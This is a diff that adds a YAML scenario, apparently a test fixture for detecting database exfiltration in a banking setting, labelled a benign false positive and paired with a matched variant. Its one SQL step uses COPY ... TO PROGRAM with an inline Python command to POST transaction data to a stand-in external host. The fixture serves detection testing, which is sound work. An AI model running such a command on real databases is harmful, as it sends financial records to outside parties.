@@ -1,0 +1,31 @@
+scenario_id: gen_banking_67_copy_to_program_ben_1839b
+family_id: gen_banking_67_copy_to_program_fam_1839
+domain: banking
+time_of_day: '15:10'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT transaction_id, amount FROM transactions WHERE branch_id = 'BR-021')
+      TO PROGRAM 'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://customs-sync.datasink.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 198.51.100.93
+      port: 8080
+matched_pair_id: gen_banking_67_copy_to_program_pair_1839
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
